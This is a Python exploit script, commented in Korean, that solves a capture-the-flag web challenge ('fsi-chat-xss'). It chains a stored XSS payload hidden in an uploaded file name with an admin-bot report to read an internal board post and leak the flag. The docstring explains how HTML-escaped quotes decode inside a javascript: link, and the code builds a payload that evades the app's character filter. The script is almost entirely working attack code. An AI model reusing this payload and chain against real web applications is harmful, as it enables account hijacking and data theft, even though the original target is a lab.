#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FSI 채팅 — XSS → SSRF → 내부보드 flag 탈취 (fsi-chat-xss)  ·  대상 http://localhost:9090

[구조]  external-server(10.111.0.3:9090, 공개 게시판)  /  internal-server(10.111.0.4)
        ├ 내부 게시판 int/app.py(:9090) : getBoardView 가 `where seq="..."` — author 검사 없음
        │   → seq=1 에 admin 글(제목 "flag is here!", 내용 = flag) 이 init.sql 로 시드됨
        └ 관리자 봇 bot.py(:9000) : /report 로 받은 url 을 admin 으로 로그인한 채 방문하고
                                    id="uploadFile" 요소를 click() 한다(셀레늄 headless chrome)
        db(10.111.0.5) — ext/int 가 공유. 봇은 egress 방화벽으로 10.111.0.3/10.111.0.5 만 통신.

[취약점]  view.html:  <a href="javascript:fileDown('{{filepath}}')" id="uploadFile"> ...
          Jinja 가 ' → &#39; 로 HTML 이스케이프하지만, javascript: URI 는 브라우저가
          '먼저 HTML 디코드 후 JS 실행'하므로 &#39; 가 다시 ' 가 되어 문자열 탈출이 가능.
          그리고 safeQuery 는  "  \  |  &  [ ] ! @ # $ %  만 이스케이프 → '  (  )  ; 는 무사통과.
          filepath(=업로드 파일명)에 JS 를 심으면, 봇이 uploadFile 을 클릭하는 순간
          admin 컨텍스트(내부 보드 origin)에서 임의 JS 가 실행된다.

[익스 체인]
  1) 공개 보드에 '내용 없는 빈 파일'을 올리되 파일명 자체를 XSS 페이로드로 → board.filepath 에 저장
  2) /report 로 내부 보드 뷰( http://10.111.0.4:9090/board/<myseq> )를 신고
  3) 봇(admin)이 그 글을 열고 uploadFile 클릭 → 페이로드 실행:
       - 동기 XHR GET /board/1  (author 검사 없음 → admin 으로 flag 열람)
       - flag 추출 후 내부 /write 로 '제목=flag, author=admin' 새 글 작성(공유 DB 기록)
  4) 공격자는 공개 보드 목록에서 그 글을 본다 — getBoardList 가
       `where author="me" OR author="admin"` 라 admin 글 '제목'(=flag)이 내 목록에 노출된다.

[주의] 봇(셀레늄 3.141 + 2022년 chrome)은 버전 부패로 2026년 환경에선 chrome 구동이 막힐 수 있다
       (SOLUTIONS.md 참고). 본 스크립트의 공격자측 로직은 동일하며, 봇이 정상이면 그대로 flag 가 나온다.

실행:  python fsi_xss.py
"""
import sys, re, time
import requests

BASE     = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:9090"
INT_VIEW = "http://10.111.0.4:9090/board"   # 봇이 도달 가능한 내부 보드(자기 IP, 방화벽 허용)

# 봇이 클릭으로 실행할 JS.  safeQuery 금지문자( " \ | & [ ] ! @ # $ % )와 '리터럴 /' 를 모두 회피
#  - '/' 는 String.fromCharCode(47) 로 생성(파일명에 슬래시 truncation/이스케이프 회피)
#  - 제출 본문은 FormData(.append) 사용 → '&' 구분자 불필요
JS = ("var s=String.fromCharCode(47);"
      "var x=new XMLHttpRequest();x.open('GET',s+'board'+s+'1',false);x.send();"
      "var t=x.responseText;var i=t.indexOf('fsi2022');var f=t.substring(i,t.indexOf('}',i)+1);"
      "var fd=new FormData();fd.append('subject',f);fd.append('author','admin');fd.append('content','x');"
      "var w=new XMLHttpRequest();w.open('POST',s+'write',false);w.send(fd);")
# fileDown('  <payload>  ') 안에서 탈출: ');  ...JS... ;v=('  → fileDown('');JS;v=('')
PAYLOAD = "');" + JS + "v=('"

def main():
    bad = set('"\\|&[]!@#$%/') & set(PAYLOAD)
    print("[*] payload forbidden-char check:", bad if bad else "clean (safeQuery 통과)")

    s = requests.Session()
    uid = "xss_%d" % (int(time.time()) % 100000)
    s.post(BASE + "/register", data={"userid": uid, "userpw": "pw"}, timeout=10)
    s.post(BASE + "/login",    data={"userid": uid, "userpw": "pw"}, timeout=10)
    marker = "mark_" + uid

    # 1) 빈 파일을 올리고 '파일명' 을 페이로드로 → filepath 에 저장
    s.post(BASE + "/write",
           data={"subject": marker, "author": uid, "content": "pwn"},
           files={"file": (PAYLOAD, b"")}, timeout=10)

    # 2) 내 글 seq 찾기 (목록의 id="article-<seq>">제목</a>)
    seq = None
    for sq, subj in re.findall(r'article-(\d+)"[^>]*>([^<]*)</a>', s.get(BASE + "/board").text):
        if marker in subj:
            seq = sq
    if not seq:
        print("[-] 내 글 seq 를 못 찾음 — 기동 상태 확인"); return 1
    print("[*] stored XSS post seq=%s  (attacker=%s)" % (seq, uid))

    # 3) 내부 보드 뷰를 신고 → admin 봇이 방문/클릭
    s.post(BASE + "/report", data={"url": "http://10.111.0.4:9090/board/%s" % seq}, timeout=30)
    print("[*] reported internal /board/%s → waiting for admin bot ..." % seq)

    # 4) 공개 보드 목록에서 봇이 적어낸 flag(제목) 회수
    for _ in range(16):
        time.sleep(3)
        m = re.search(r"fsi2022\{[^}]*\}", s.get(BASE + "/board").text)
        if m:
            print("[+] FLAG (fsi-chat-xss):", m.group(0))
            return 0
    print("[-] flag 미회수 — 봇(chrome) 구동 상태를 확인하세요(버전부패 시 SOLUTIONS.md 참고).")
    return 1

if __name__ == "__main__":
    raise SystemExit(main())
